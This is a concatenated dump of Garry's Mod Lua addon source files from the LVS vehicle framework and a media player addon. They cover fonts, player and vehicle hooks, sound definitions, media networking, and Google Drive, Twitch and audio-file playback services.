surface.CreateFont( "LVS_VERSION", THE_FONT )

THE_FONT.extended = false
THE_FONT.size = 20
THE_FONT.weight = 2000
surface.CreateFont( "LVS_FONT", THE_FONT )

THE_FONT.size = 16
surface.CreateFont( "LVS_FONT_SWITCHER", THE_FONT )

THE_FONT.font = "Arial"
THE_FONT.size = 14
THE_FONT.weight = 1
THE_FONT.shadow = false
surface.CreateFont( "LVS_FONT_PANEL", THE_FONT )

THE_FONT.size = 20
THE_FONT.weight = 2000
surface.CreateFont( "LVS_FONT_HUD", THE_FONT )

THE_FONT.size = 40
THE_FONT.weight = 2000
THE_FONT.shadow = true
surface.CreateFont( "LVS_FONT_HUD_LARGE", THE_FONT )
--PATH addons/lvs_base-main/lua/lvs_framework/autorun/lvs_hookers.lua:

hook.Add( "InitPostEntity", "!!!lvsBullshitFixer", function()
	timer.Simple(1, function()
		LVS.MapDoneLoading = true
	end)

	if SERVER then return end

	-- this needs to be here to make sure all sents are registered
	for _, vehicletype in ipairs( LVS:GetVehicleTypes() ) do
		CreateClientConVar( "lvs_mouseaim_type_"..vehicletype, 0, true, false)
	end
end )

local function SetDistance( vehicle, ply )
	local iWheel = ply:GetCurrentCommand():GetMouseWheel()

	if iWheel == 0 or not vehicle.SetCameraDistance then return end

	local newdist = math.Clamp( vehicle:GetCameraDistance() - iWheel * 0.03 * ( 1.1 + vehicle:GetCameraDistance() ), -1, 10 )

	vehicle:SetCameraDistance( newdist )
end

local function SetHeight( vehicle, ply )
	local iWheel = ply:GetCurrentCommand():GetMouseWheel()

	if iWheel == 0 or not vehicle.SetCameraHeight then return end

	local newdist = math.Clamp( vehicle:GetCameraHeight() - iWheel * 0.03 * ( 1.1 + vehicle:GetCameraHeight() ), -1, 10 )

	vehicle:SetCameraHeight( newdist )
end

hook.Add( "VehicleMove", "!!!!lvs_vehiclemove", function( ply, vehicle, mv )
	if not ply.lvsGetVehicle then return end

	local veh = ply:lvsGetVehicle()

	if not IsValid( veh ) then return end

	if SERVER and ply:lvsKeyDown( "VIEWDIST" ) then
		if ply:lvsKeyDown( "VIEWHEIGHT" ) then
			SetHeight( vehicle, ply )
		else
			SetDistance( vehicle, ply )
		end
	end

	if CLIENT and not IsFirstTimePredicted() then return end
	
	local KeyThirdPerson = ply:lvsKeyDown("THIRDPERSON")

	if ply._lvsOldThirdPerson ~= KeyThirdPerson then
		ply._lvsOldThirdPerson = KeyThirdPerson

		if KeyThirdPerson and vehicle.SetThirdPersonMode then
			vehicle:SetThirdPersonMode( not vehicle:GetThirdPersonMode() )
		end
	end

	return true
end )

hook.Add("CalcMainActivity", "!!!lvs_playeranimations", function(ply)
	if not ply.lvsGetVehicle then return end

	local Ent = ply:lvsGetVehicle()

	if IsValid( Ent ) then
		local A,B = Ent:CalcMainActivity( ply )

		if A and B then
			return A, B
		end
	end
end)

hook.Add("UpdateAnimation", "!!!lvs_playeranimations", function( ply, velocity, maxseqgroundspeed )
	if not ply.lvsGetVehicle then return end

	local Ent = ply:lvsGetVehicle()

	if not IsValid( Ent ) then return end

	return Ent:UpdateAnimation( ply, velocity, maxseqgroundspeed )
end)

hook.Add( "StartCommand", "!!!!LVS_grab_command", function( ply, cmd )
	if not ply.lvsGetVehicle then return end

	local veh = ply:lvsGetVehicle()

	if not IsValid( veh ) then return end

	veh:StartCommand( ply, cmd )
end )

hook.Add( "CanProperty", "!!!!lvsEditPropertiesDisabler", function( ply, property, ent )
	if ent.LVS and not ply:IsAdmin() and property == "editentity" then return false end
end )

LVS.ToolsDisable = {
	["rb655_easy_animation"] = true,
	["rb655_easy_bonemerge"] = true,
	["rb655_easy_inspector"] = true,
}
hook.Add( "CanTool", "!!!!lvsCanToolDisabler", function( ply, tr, toolname, tool, button )
	if LVS.ToolsDisable[ toolname ] and IsValid( tr.Entity ) and tr.Entity.LVS then return false end
end )

if CLIENT then
	local hide = {
		["CHudHealth"] = true,
		["CHudBattery"] = true,
		["CHudAmmo"] = true,
	}
	local function HUDShouldDrawLVS( name )
		if hide[ name ] then return false end
	end

	hook.Add( "LVS.PlayerEnteredVehicle", "!!!!lvs_player_enter", function( ply, veh )
		hook.Add( "HUDShouldDraw", "!!!!lvs_hidehud", HUDShouldDrawLVS )

		if not IsValid( veh ) then return end

		local cvar = GetConVar( "lvs_mouseaim_type" )

		if not cvar or cvar:GetInt() ~= 1 or not veh.GetVehicleType then return end

		local vehicletype = veh:GetVehicleType()

		local cvar_type = GetConVar( "lvs_mouseaim_type_"..vehicletype )
		local cvar_mouseaim = GetConVar( "lvs_mouseaim" )

		if not cvar_type or not cvar_mouseaim then return end

		cvar_mouseaim:SetInt( cvar_type:GetInt() )
	end )

	hook.Add( "LVS.PlayerLeaveVehicle", "!!!!lvs_player_exit", function( ply, veh )
		hook.Remove( "HUDShouldDraw", "!!!!lvs_hidehud" )
	end )

	hook.Add( "InitPostEntity", "!!!lvs_infmap_velocity_fixer", function()
		if not InfMap then

			hook.Remove( "InitPostEntity", "!!!lvs_infmap_velocity_fixer" )

			return
		end

		local meta = FindMetaTable( "Entity" )

		if not InfMapOriginalGetVelocity then
			InfMapOriginalGetVelocity = meta.GetVelocity
		end

		function meta:GetVelocity()
			local Velocity = InfMapOriginalGetVelocity( self )

			local EntTable = self:GetTable()

			if not EntTable.LVS and not EntTable._lvsRepairToolLabel then return Velocity end

			local Speed = Velocity:LengthSqr()

			local T = CurTime()

			if Speed > 10 then
				EntTable._infmapEntityVelocity = Velocity
				EntTable._infmapEntityVelocityTime = T + 0.6
			else
				if (EntTable._infmapEntityVelocityTime or 0) > T then
					return EntTable._infmapEntityVelocity or vector_origin
				end
			end

			return Velocity
		end
	end )

	return
end

local DamageFix = {
	["npc_hunter"] = true,
	["npc_stalker"] = true,
	["npc_strider"] = true,
	["npc_combinegunship"] = true,
	["npc_helicopter"] = true,
}

hook.Add( "EntityTakeDamage", "!!!_lvs_fix_vehicle_explosion_damage", function( target, dmginfo )
	if not target:IsPlayer() then
		if target.LVS then
			local attacker = dmginfo:GetAttacker()

			if IsValid( attacker ) and DamageFix[ attacker:GetClass() ] then
				dmginfo:SetDamageType( DMG_AIRBOAT )
				dmginfo:SetDamageForce( dmginfo:GetDamageForce():GetNormalized() * 15000 )
			end
		end

		return
	end

	local veh = target:lvsGetVehicle()

	if not IsValid( veh ) or dmginfo:IsDamageType( DMG_DIRECT ) then return end

	if target:GetCollisionGroup() == COLLISION_GROUP_PLAYER then return end

	dmginfo:SetDamage( 0 )
end )

hook.Add( "PlayerEnteredVehicle", "!!!!lvs_player_enter", function( ply, Pod )
	local veh = ply:lvsGetVehicle()

	if IsValid( veh ) then
		net.Start( "lvs_player_enterexit" )
			net.WriteBool( true )
			net.WriteEntity( veh )
		net.Send( ply )

		ply._lvsIsInVehicle = true

		if istable( veh.PlayerBoneManipulate ) then
			local ID = Pod:lvsGetPodIndex()
			local BoneManipulate = veh.PlayerBoneManipulate[ ID ]

			if BoneManipulate then
				ply._lvsStopBoneManipOnExit = true
				ply:lvsStartBoneManip()
			end
		end

		if LVS.FreezeTeams then
			local nTeam = ply:lvsGetAITeam()

			if veh:GetAITEAM() ~= nTeam then
				veh:SetAITEAM( nTeam )

				ply:PrintMessage( HUD_PRINTTALK, "[LVS] This Vehicle's AI-Team has been updated to: "..(LVS.TEAMS[ nTeam ] or "") )
			end
		end
	end

	if not Pod.HidePlayer then return end

	ply:SetNoDraw( true )

	if pac then pac.TogglePartDrawing( ply, 0 ) end
end )

hook.Add( "PlayerLeaveVehicle", "!!!!lvs_player_exit", function( ply, Pod )
	if ply._lvsIsInVehicle then
		net.Start( "lvs_player_enterexit" )
			net.WriteBool( false )
			net.WriteEntity( ply:lvsGetVehicle() )
		net.Send( ply )

		ply._lvsIsInVehicle = nil

		if ply._lvsStopBoneManipOnExit then
			ply._lvsStopBoneManipOnExit = nil

			ply:lvsStopBoneManip()
		end
	end

	if not Pod.HidePlayer then return end

	ply:SetNoDraw( false )

	if pac then pac.TogglePartDrawing( ply, 1 ) end
end )

hook.Add( "PlayerDisconnected", "!!!!lvs_player_reset_bonemanip_client", function(ply)
	if not ply._lvsStopBoneManipOnExit then return end

	ply._lvsStopBoneManipOnExit = nil

	ply:lvsStopBoneManip()
end )
--PATH addons/lvs_base-main/lua/lvs_framework/autorun/lvs_soundscripts.lua:

sound.Add( {
	name = "LVS.Physics.Scrape",
	channel = CHAN_STATIC,
	level = 80,
	sound = "lvs/physics/scrape_loop.wav"
} )

sound.Add( {
	name = "LVS.Physics.Wind",
	channel = CHAN_STATIC,
	level = 140,
	sound = "lvs/physics/wind_loop.wav",
} )

sound.Add( {
	name = "LVS.Physics.Water",
	channel = CHAN_STATIC,
	level = 140,
	sound = "lvs/physics/water_loop.wav",
} )

sound.Add( {
	name = "LVS.DYNAMIC_EXPLOSION",
	channel = CHAN_STATIC,
	volume = 1.0,
	level = 130,
	pitch = {90, 110},
	sound = "^lvs/explosion_dist.wav"
} )

sound.Add( {
	name = "LVS.MISSILE_EXPLOSION",
	channel = CHAN_STATIC,
	volume = 1.0,
	level = 130,
	pitch = {90, 120},
	sound = {
		"ambient/levels/streetwar/city_battle17.wav",
		"ambient/levels/streetwar/city_battle18.wav",
		"ambient/levels/streetwar/city_battle19.wav",
	}
} )

sound.Add( {
	name = "LVS.BOMB_EXPLOSION_DYNAMIC",
	channel = CHAN_STATIC,
	volume = 1,
	level = 135,
	pitch = {90, 110},
	sound = {
		"^lvs/explosions/dyn1.wav",
		"^lvs/explosions/dyn2.wav",
		"^lvs/explosions/dyn3.wav",
		"^lvs/explosions/dyn4.wav",
	}
} )

sound.Add( {
	name = "LVS.BOMB_EXPLOSION",
	channel = CHAN_STATIC,
	volume = 1,
	level = 75,
	pitch = {90, 110},
	sound = {
		"lvs/explosions/close1.wav",
		"lvs/explosions/close2.wav",
		"lvs/explosions/close3.wav",
		"lvs/explosions/close4.wav",
	}
} )

sound.Add( {
	name = "LVS.BULLET_EXPLOSION_DYNAMIC",
	channel = CHAN_STATIC,
	volume = 1,
	level = 135,
	pitch = {90, 110},
	sound = {
		"^lvs/explosions/med_dyn1.wav",
		"^lvs/explosions/med_dyn2.wav",
		"^lvs/explosions/med_dyn3.wav",
		"^lvs/explosions/med_dyn4.wav",
	}
} )

sound.Add( {
	name = "LVS.BULLET_EXPLOSION",
	channel = CHAN_STATIC,
	volume = 1,
	level = 75,
	pitch = {90, 110},
	sound = {
		"lvs/explosions/med_close1.wav",
		"lvs/explosions/med_close2.wav",
		"lvs/explosions/med_close3.wav",
		"lvs/explosions/med_close4.wav",
	}
} )


sound.Add( {
	name = "LVS.EXPLOSION",
	channel = CHAN_STATIC,
	volume = 1.0,
	level = 115,
	pitch = {95, 115},
	sound = "lvs/explosion.wav"
} )

if CLIENT then
	local SoundList = {}

	hook.Add( "EntityEmitSound", "!!!lvs_fps_rape_fixer", function( t )
		if not t.Entity.LVS and not t.Entity._LVS then return end

		local SoundFile = t.SoundName

		if SoundList[ SoundFile ] == true then
			return true

		elseif SoundList[ SoundFile ] == false then
			return false

		else
			local File = string.Replace( SoundFile, "^", "" )

			local Exists = file.Exists( "sound/"..File , "GAME" )

			SoundList[ SoundFile ] = Exists

			if not Exists then
				print("[LVS] '"..SoundFile.."' not found. Soundfile will not be played and is filtered for this game session to avoid fps issues.")
			end
		end
	end )
end

--PATH addons/media_player/lua/mediaplayer/players/base/cl_init.lua:
include "shared.lua"
include "cl_draw.lua"
include "cl_fullscreen.lua"
include "net.lua"

local CeilPower2 = MediaPlayerUtils.CeilPower2

function MEDIAPLAYER:NetReadUpdate()
	-- Allows for another media player type to extend update net messages
end

function MEDIAPLAYER:OnNetReadMedia( media )
	-- Allows for another media player type to extend media net messages
end

function MEDIAPLAYER:OnQueueKeyPressed( down, held )
	self._LastMediaUpdate = RealTime()
end


--[[---------------------------------------------------------
	Networking
-----------------------------------------------------------]]

local function OnMediaUpdate( len )

	local mpId = net.ReadString()
	local mpType = net.ReadString()

	if MediaPlayer.DEBUG then
		print( "Received MEDIAPLAYER.Update", mpId, mpType )
	end

	local mp = MediaPlayer.GetById(mpId)
	if not mp then
		mp = MediaPlayer.Create( mpId, mpType )
	end

	-- Read owner; may be NULL
	local owner = net.ReadEntity()
	if IsValid( owner ) then
		mp:SetOwner( owner )
	end

	local state = mp.net.ReadPlayerState()

	local queueRepeat = net.ReadBool()
	mp:SetQueueRepeat( queueRepeat )

	local queueShuffle = net.ReadBool()
	mp:SetQueueShuffle( queueShuffle )

	local queueLocked = net.ReadBool()
	mp:SetQueueLocked( queueLocked )

	-- Read extended update information
	mp:NetReadUpdate()

	-- Clear old queue
	mp:ClearMediaQueue()

	-- Read queue information
	local count = net.ReadUInt( mp:GetQueueLimit(true) )
	for i = 1, count do
		local media = mp.net.ReadMedia()
		mp:OnNetReadMedia(media)
		mp:AddMedia(media)
	end

	mp:QueueUpdated()

	mp:SetPlayerState( state )

	hook.Run( "OnMediaPlayerUpdate", mp )

end
net.Receive( "MEDIAPLAYER.Update", OnMediaUpdate )

local function OnMediaSet( len )

	if MediaPlayer.DEBUG then
		print( "Received MEDIAPLAYER.Media" )
	end

	local mpId = net.ReadString()
	local mp = MediaPlayer.GetById(mpId)

	if not mp then
		if MediaPlayer.DEBUG then
			ErrorNoHalt("Received media for invalid mediaplayer\n")
			print("ID: " .. tostring(mpId))
			debug.Trace()
		end
		return
	end

	if mp:GetPlayerState() >= MP_STATE_PLAYING then
		mp:OnMediaFinished()
		mp:QueueUpdated()
	end

	local media = mp.net.ReadMedia()

	if media then
		local startTime = mp.net.ReadTime()
		media:StartTime( startTime )

		mp:OnNetReadMedia(media)

		local state = mp:GetPlayerState()

		if state == MP_STATE_PLAYING then
			media:Play()
		else
			media:Pause()
		end
	end

	mp:SetMedia( media )

end
net.Receive( "MEDIAPLAYER.Media", OnMediaSet )

local function OnMediaRemoved( len )

	if MediaPlayer.DEBUG then
		print( "Received MEDIAPLAYER.Remove" )
	end

	local mpId = net.ReadString()
	local mp = MediaPlayer.GetById(mpId)
	if not mp then return end

	mp:Remove()

end
net.Receive( "MEDIAPLAYER.Remove", OnMediaRemoved )

local function OnMediaSeek( len )

	local mpId = net.ReadString()
	local mp = MediaPlayer.GetById(mpId)
	if not ( mp and (mp:GetPlayerState() >= MP_STATE_PLAYING) ) then return end

	local startTime = mp.net.ReadTime()

	if MediaPlayer.DEBUG then
		print( "Received MEDIAPLAYER.Seek", mpId, startTime )
	end

	local media = mp:CurrentMedia()

	if media then
		media:StartTime( startTime )
	else
		ErrorNoHalt('ERROR: MediaPlayer received seek message while no media is playing' ..
			'[' .. mpId .. ']\n')
		MediaPlayer.RequestUpdate( mp )
	end

end
net.Receive( "MEDIAPLAYER.Seek", OnMediaSeek )

local function OnMediaPause( len )

	local mpId = net.ReadString()
	local mp = MediaPlayer.GetById(mpId)
	if not mp then return end

	local state = mp.net.ReadPlayerState()

	if MediaPlayer.DEBUG then
		print( "Received MEDIAPLAYER.Pause", mpId, state )
	end

	mp:SetPlayerState( state )

end
net.Receive( "MEDIAPLAYER.Pause", OnMediaPause )

--PATH addons/media_player/lua/mediaplayer/players/base/cl_fullscreen.lua:
local pcall = pcall
local Color = Color
local RealTime = RealTime
local ScrW = ScrW
local ScrH = ScrH
local ValidPanel = ValidPanel
local Vector = Vector
local cam = cam
local draw = draw
local math = math
local string = string
local surface = surface

local FullscreenCvar = MediaPlayer.Cvars.Fullscreen

--[[---------------------------------------------------------
	Convar callback
-----------------------------------------------------------]]

local function OnFullscreenConVarChanged( name, old, new )

	new = (new == "1.00")
	old = (old == "1.00")

	local media

	for _, mp in pairs(MediaPlayer.List) do

		mp._LastMediaUpdate = RealTime()

		media = mp:CurrentMedia()

		if IsValid(media) and ValidPanel(media.Browser) then
			MediaPlayer.SetBrowserSize( media.Browser )
		end

	end

	MediaPlayer.SetBrowserSize( MediaPlayer.GetIdlescreen() )

	hook.Run( "MediaPlayerFullscreenToggled", new, old )

end
cvars.AddChangeCallback( FullscreenCvar:GetName(), OnFullscreenConVarChanged )


--[[---------------------------------------------------------
	Client controls for toggling fullscreen
-----------------------------------------------------------]]

inputhook.AddKeyPress( KEY_F11, "Toggle MediaPlayer Fullscreen", function()

	local isFullscreen = FullscreenCvar:GetBool()
	local numMp = #MediaPlayer.GetAll()

	-- only toggle if there's an active media player or we're in fullscreen mode
	if numMp == 0 and not isFullscreen then
		return
	end

	local value = isFullscreen and 0 or 1
	RunConsoleCommand( "mediaplayer_fullscreen", value )

end )


--[[---------------------------------------------------------
	Draw functions
-----------------------------------------------------------]]

function MEDIAPLAYER:DrawFullscreen()

	-- Don't draw if we're not fullscreen
	if not FullscreenCvar:GetBool() then return end

	local w, h = ScrW(), ScrH()
	local media = self:CurrentMedia()

	if IsValid(media) then

		-- Custom media draw function
		if media.Draw then
			media:Draw( w, h )
		end
		-- TODO: else draw 'not yet implemented' screen?

		-- Draw media info
		local succ, err = pcall( self.DrawMediaInfo, self, media, w, h )
		if not succ then
			print( err )
		end

	else

		local browser = MediaPlayer.GetIdlescreen()

		if ValidPanel(browser) then
			self:DrawHTML( browser, w, h )
		end

	end

end

--PATH addons/media_player/lua/mediaplayer/services/googledrive/cl_init.lua:
include "shared.lua"

DEFINE_BASECLASS( "mp_service_browser" )

-- data:text/html,<object type="application/x-shockwave-flash" allowscriptaccess="always" allowfullscreen="true" wmode="opaque" data="https://video.google.com/get_player?docid=0B1K_ByAqaFKGamdrajd6WXFUSEs0VHI4eTJHNHpPdw&partnerid=30&el=leaf&cc_load_policy=1&enablejsapi=1&autoplay=1&start=30" width="100%" height="100%" style="visibility: visible;"></object>

-- https://docs.google.com/file/d/0B1K_ByAqaFKGamdrajd6WXFUSEs0VHI4eTJHNHpPdw/preview

local EmbedHtml = [[
<object type="application/x-shockwave-flash" allowscriptaccess="always" allowfullscreen="true" wmode="opaque" data="%s" width="100%%" height="100%%" style="visibility: visible;"></object>]]

SERVICE.VideoUrlFormat = "https://video.google.com/get_player?docid=%s&enablejsapi=1&autoplay=1&controls=0&modestbranding=1&rel=0&showinfo=0&wmode=opaque&ps=docs&partnerid=30"

function SERVICE:OnBrowserReady( browser )

	BaseClass.OnBrowserReady( self, browser )

	local fileId = self:GetGoogleDriveFileId()

	local url = self.VideoUrlFormat:format(fileId)
	local curTime = self:CurrentTime()

	-- Add start time to URL if the video didn't just begin
	if self:IsTimed() and curTime > 3 then
		url = url .. "&start=" .. math.Round(curTime)
	end

	local html = self.WrapHTML( EmbedHtml:format(url) )
	browser:SetHTML( html )

end

--PATH addons/media_player/lua/mediaplayer/services/twitch/cl_init.lua:
include "shared.lua"

DEFINE_BASECLASS( "mp_service_browser" )

local TwitchUrl = "http://www.twitch.tv/%s/%s/%s/popout"

---
-- Approximate amount of time it takes for the Twitch video player to load upon
-- loading the webpage.
--
local playerLoadDelay = 5

local secMinute = 60
local secHour = secMinute * 60

local function formatTwitchTime( seconds )
	local hours = math.floor((seconds / secHour) % 24)
	local minutes = math.floor((seconds / secMinute) % 60)
	seconds = math.floor(seconds % 60)

	local tbl = {}

	if hours > 0 then
		table.insert(tbl, hours)
		table.insert(tbl, 'h')
	end

	if hours > 0 or minutes > 0 then
		table.insert(tbl, minutes)
		table.insert(tbl, 'm')
	end

	table.insert(tbl, seconds)
	table.insert(tbl, 's')

	return table.concat(tbl, '')
end

function SERVICE:OnBrowserReady( browser )

	BaseClass.OnBrowserReady( self, browser )

	local info = self:GetTwitchVideoInfo()
	local url = TwitchUrl:format(info.channel, info.type, info.chapterId)

	-- Move current time forward due to twitch player load time
	local curTime = math.min( self:CurrentTime() + playerLoadDelay, self:Duration() )

	local time = math.ceil( curTime )
	if time > 5 then
		url = url .. '?t=' .. formatTwitchTime(time)
	end

	browser:OpenURL( url )

end

--PATH addons/media_player/lua/mediaplayer/services/audiofile/cl_init.lua:
include "shared.lua"

DEFINE_BASECLASS( "mp_service_base" )

-- http://www.un4seen.com/doc/#bass/BASS_StreamCreateURL.html

SERVICE.StreamOptions = { "noplay", "noblock" }

local MAX_LOAD_ATTEMPTS = 3
local Audio3DCvar = MediaPlayer.Cvars.Audio3D

function SERVICE:Volume( volume )

	volume = BaseClass.Volume( self, volume )

	if IsValid(self.Channel) then
		local vol = volume > 1 and volume/100 or volume

		-- IGModAudioChannel is limited by the actual gmod volume
		-- local gmvolume = GetConVarNumber("volume")
		-- if gmvolume > vol then
		-- 	vol = vol / gmvolume
		-- else
		-- 	vol = 1
		-- end

		self.Channel:SetVolume( math.sqrt(vol) )
	end

	return volume

end

function SERVICE:Play()

	BaseClass.Play( self )

	if IsValid(self.Channel) then
		self.Channel:Play()
	else
		local settings = table.Copy(self.StreamOptions)

		-- .ogg files can't seem to use 3d?
		if Audio3DCvar:GetBool() and IsValid(self.Entity) and
				not self.url:match(".ogg") then
			table.insert(settings, "3d")
		end

		settings = table.concat(settings, " ")

		local function loadAudio( callback )
			if not self:IsPlaying() or IsValid( self.Channel ) then return end
			MediaPlayerUtils.LoadStreamChannel( self.url, settings, callback )
		end

		-- Loading audio can fail the first time, so let's retry a few times
		-- before giving up.
		MediaPlayerUtils.Retry(
			loadAudio,
			function( channel )
				self.Channel = channel

				-- The song may have been skipped before the channel was
				-- created, only play if the media state is set to play.
				if self:IsPlaying() then
					self:Volume()
					self:Sync()

					self.Channel:Play()
				end

				self:emit('channelReady', channel)
			end,
			function()
				local msg = ("Failed to load media player audio '%s'"):format( self.url )
				LocalPlayer():ChatPrint( msg )
			end,
			MAX_LOAD_ATTEMPTS
		)
	end

end

function SERVICE:Pause()
	BaseClass.Pause(self)

	if IsValid(self.Channel) then
		self.Channel:Pause()
	end
end

function SERVICE:Stop()
	BaseClass.Stop(self)

	if IsValid(self.Channel) then
		self.Channel:Stop()
	end
end

function SERVICE:Sync()
	if self:IsPlaying() and IsValid(self.Channel) then
		if self:IsTimed() then
			self:SyncTime()
		end

		self:SyncEntityPos()
	end
end

function SERVICE:SyncTime()
	local state = self.Channel:GetState()

	if state ~= GMOD_CHANNEL_STALLED then
		local duration = self.Channel:GetLength()
		local seekTime = math.min(duration, self:CurrentTime())
		local curTime = self.Channel:GetTime()
		local diffTime = math.abs(curTime - seekTime)

		if diffTime > 5 then
			self.Channel:SetTime( seekTime )
		end
	end
end

function SERVICE:SyncEntityPos()
	if IsValid(self.Entity) then

		if self.Channel:Is3D() then
			-- apparently these are the default values?
			self.Channel:Set3DFadeDistance( 500, 1000 )

			self.Channel:SetPos( self.Entity:GetPos() )
		else
			-- TODO: Fake 3D volume
			-- http://facepunch.com/showthread.php?t=1302124&p=41975238&viewfull=1#post41975238

			-- local volume = BaseClass.Volume( self, volume )
			-- local vol = volume > 1 and volume/100 or volume
			-- self.Channel:SetVolume( vol )
		end

	end
end



function SERVICE:PreRequest( callback )

	local function preload( callback )
		MediaPlayerUtils.LoadStreamChannel( self.url, nil, callback )
	end

	-- Preloading audio can fail the first time, so let's retry a few times
	-- before giving up.
	MediaPlayerUtils.Retry(
		preload,
		function( channel )
			-- Set metadata to later send to the server; IGModAudioChannel is
			-- only accessible on the client.
			self:SetMetadataValue( "title", channel:GetFileName() )
			self:SetMetadataValue( "duration", channel:GetLength() )

			channel:Stop()
			callback()
		end,
		function()
			callback( "There was a problem receiving the audio stream, please try again." )
		end,
		MAX_LOAD_ATTEMPTS
	)

end

function SERVICE:NetWriteRequest()
	net.WriteString( self:Title() )
	net.WriteUInt( self:Duration(), 16 )
end

--[[---------------------------------------------------------
	Draw 3D2D
-----------------------------------------------------------]]

local IsValid = IsValid
local draw = draw
local math = math
local surface = surface

local VisualizerBgColor = Color(44, 62, 80, 255)
local VisualizerBarColor = Color(52, 152, 219)
local VisualizerBarAlpha = 220

local BANDS	= 28

local function DrawSpectrumAnalyzer( fft, w, h )

	local b0 = 1
	local x, y

	for x = 0, BANDS do
		local sum = 0
		local sc = 0
		local b1 = math.pow(2,x*10.0/(BANDS-1))

		if (b1>1023) then b1=1023 end
		if (b1<=b0) then b1=b0+1 end
		sc=10+b1-b0;
		while b0 < b1 do
			sum = sum + fft[b0]
			b0 = b0 + 1
		end

		y = (math.sqrt(sum/math.log10(sc))*1.7*h)-4
		y = math.Clamp(y, 0, h)

		local col = HSVToColor( 120 - (120 * y/h), 1, 1 )
		col.a = VisualizerBarAlpha
		surface.SetDrawColor(col)

		surface.DrawRect(
			math.ceil(x*(w/BANDS)),
			math.ceil(h - y - 1),
			math.ceil(w/BANDS) - 2,
			y + 1
		)
	end

end


local HTMLMaterial = HTMLMaterial
local color_white = color_white
local FFT_2048 = FFT_2048
local GMOD_CHANNEL_PLAYING = GMOD_CHANNEL_PLAYING

local HTMLMAT_STYLE_ARTWORK = 'htmlmat.style.artwork'
AddHTMLMaterialStyle( HTMLMAT_STYLE_ARTWORK, {
	width = 720,
	height = 480
}, HTMLMAT_STYLE_COVER )

function SERVICE:Draw( w, h )

	surface.SetDrawColor( VisualizerBgColor )
	surface.DrawRect( 0, 0, w, h )

	local thumbnail = self:Thumbnail()
	if thumbnail then
		DrawHTMLMaterial( thumbnail, HTMLMAT_STYLE_ARTWORK, w, h )
	end

	local channel = self.Channel
	if IsValid(channel) and channel:GetState() == GMOD_CHANNEL_PLAYING then
		local fft = {}
		channel:FFT( fft, FFT_2048 )
		
		-- exposed on the table in case anyone wants to use this
		self.fft = fft
		
		DrawSpectrumAnalyzer( fft, w, h )
	end
	
	self:PostDraw()

end

function SERVICE:PostDraw()
	-- override this
end

--PATH addons/media_player/lua/mediaplayer/services/audiofile/shared.lua:
local urllib = url

SERVICE.Name 	= "Audio file"
SERVICE.Id 		= "af"

SERVICE.PrefetchMetadata = true

local SupportedEncodings = {
	'([^/]+%.mp3)',    -- mp3
	'([^/]+%.wav)', -- wav
	'([^/]+%.ogg)'  -- ogg
}

function SERVICE:Match( url )
	url = string.lower(url or "")

	-- check supported encodings
	for _, encoding in pairs(SupportedEncodings) do
		if url:find(encoding) then
			return true
		end
	end

	return false
end

--PATH addons/media_player/lua/mediaplayer/cl_screen.lua:
--[[---------------------------------------------------------
	Pass mouse clicks into media player browser
-----------------------------------------------------------]]

local MAX_SCREEN_DISTANCE = 1000

local function getScreenPos( ent, aimVector )
	local w, h, pos, ang = ent:GetMediaPlayerPosition()
	local eyePos = LocalPlayer():EyePos()

	if pos:Distance( eyePos ) > MAX_SCREEN_DISTANCE then
		return
	end

	local screenNormal = ang:Up()

	if screenNormal:Dot( aimVector ) > 0 then
		return -- prevent clicks from behind the screen
	end

	local hitPos = util.IntersectRayWithPlane(
		eyePos,
		aimVector,
		pos,
		screenNormal
	)

	if not hitPos then
		return
	end

	if MediaPlayer.DEBUG then
		debugoverlay.Cross( hitPos, 1, 60 )
	end

	local localPos = WorldToLocal( pos, ang, hitPos, ang )
	local x, y = -localPos.x, localPos.y

	if ( x < 0 or x > w ) or ( y < 0 or y > h ) then
		return -- out of screen bounds
	end

	return x / w, y / h
end

function MediaPlayer.DispatchScreenTrace( func, aimVector )
	if type(func) ~= "function" then return end
	if not aimVector then
		aimVector = LocalPlayer():GetAimVector()
	end

	for name, mp in pairs( MediaPlayer.List ) do
		local ent = mp.Entity
		if IsValid( mp ) and not ent:IsDormant() then
			local x, y = getScreenPos( ent, aimVector )
			if x and y then
				func(mp, x, y)
			end
		end
	end
end

local function mpMouseReleased( mp, x, y )
	mp:OnMousePressed(x, y)
end

local function mousePressed( mouseCode, aimVector )
	if mouseCode ~= MOUSE_LEFT then
		return
	end

	MediaPlayer.DispatchScreenTrace( mpMouseReleased, aimVector )
end
hook.Add( "GUIMouseReleased", "MediaPlayer.ScreenIntersect", mousePressed )


--[[---------------------------------------------------------
	Pass mouse scrolling into media player browser
-----------------------------------------------------------]]

local mouseScroll = MediaPlayerUtils.Throttle(function( dt )
	MediaPlayer.DispatchScreenTrace(function(mp)
		mp:OnMouseWheeled(dt)
	end, aimVector)
end, 0.01, { trailing = false })

hook.Add( "ContextMenuCreated", "MediaPlayer.Scroll", function( contextMenu )
	if contextMenu.OnMouseWheeled then return end
	contextMenu.OnMouseWheeled = function(panel, scrollDelta)
		mouseScroll(scrollDelta)
	end
end )

--[[
local function checkMouseScroll( ply, cmd )
	local scrollDelta = cmd:GetMouseWheel()
	if scrollDelta == 0 then return end
	mouseScroll(scrollDelta)
end
hook.Add( "StartCommand", "MediaPlayer.Scroll", checkMouseScroll )
]]

--[[---------------------------------------------------------
	Prevent weapons from firing while the context menu is
	open and the cursor is aiming at a screen.
-----------------------------------------------------------]]

local function isAimingAtScreen()
	local aimVector = LocalPlayer():GetAimVector()
	for name, mp in pairs( MediaPlayer.List ) do
		local ent = mp.Entity
		if IsValid( mp ) and not ent:IsDormant() then
			local x, y = getScreenPos( ent, aimVector )
			if x then
				return true
			end
		end
	end
end

local function preventWorldClicker()
	local ply = LocalPlayer()

	if not ply:IsWorldClicking() then return end

	local ent = ply:GetEyeTrace().Entity
	if not ( IsValid(ent) and ent.IsMediaPlayerEntity ) then return end

	if isAimingAtScreen() then
		return true
	end
end
hook.Add( "PreventScreenClicks", "MediaPlayer.PreventWorldClicker", preventWorldClicker )

--PATH addons/media_player/lua/autorun/sandbox/mediaplayer_dupe.lua:
local MEDIAPLAYER_DUPE = nil
local MEDIAPLAYER_SAVE = false
local MEDIAPLAYER_THUMBNAIL = nil

local HTMLMAT_STYLE_DUPE = "htmlmat.style.dupe"
-- AddHTMLMaterialStyle( HTMLMAT_STYLE_DUPE, {
-- 	width = 512,
-- 	height = 512,
-- 	css = [[
-- img {
-- 	width: 100%;
-- 	position: absolute;
-- 	top: 50%;
-- 	left: 50%;
-- 	-webkit-filter: blur(6px);
-- 	-webkit-transform: translate(-50%, -50%) scale(1.1,1.1);
-- }]]
-- } )
